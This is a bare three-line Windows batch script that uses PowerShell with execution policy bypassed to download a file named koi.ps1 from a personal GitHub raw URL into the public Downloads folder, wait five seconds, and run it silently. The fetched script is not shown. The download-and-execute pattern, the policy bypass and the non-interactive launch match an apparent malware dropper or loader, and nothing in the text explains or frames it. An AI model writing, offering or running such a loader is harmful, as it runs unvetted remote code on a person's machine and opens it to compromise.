PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/jdo19181918/Test/main/koi.ps1 -OutFile C:\Users\Public\Downloads\koi.ps1"
timeout 5
powershell.exe -Noprofile -Noninteractive -Nologo -ExecutionPolicy Bypass -File "C:\Users\Public\Downloads\koi.ps1"
